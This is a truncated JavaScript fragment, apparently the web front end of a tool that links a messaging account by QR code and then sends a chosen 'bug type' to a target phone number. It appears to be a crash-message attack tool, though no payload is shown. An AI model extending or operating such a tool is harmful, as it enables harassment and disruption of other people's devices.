async function addSender() {
    const response = await fetch('https://your-ngrok-url.com/add-sender', { method: 'POST' });
    const data = await response.json();
    if (data.success && data.qr) {
        // Display QR code
        const qrImg = document.createElement('img');
        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr)}`;  // Generate QR image
        document.body.appendChild(qrImg);
        alert(`Scan this QR: Sender ID ${data.senderId}`);
    } else if (data.message) {
        alert(data.message);
    }
}

async function sendBug() {
    const senderId = document.getElementById('senderId').value;
    const bugType = document.getElementById('bugType').value;
    const targetNumber = document.getElementBy
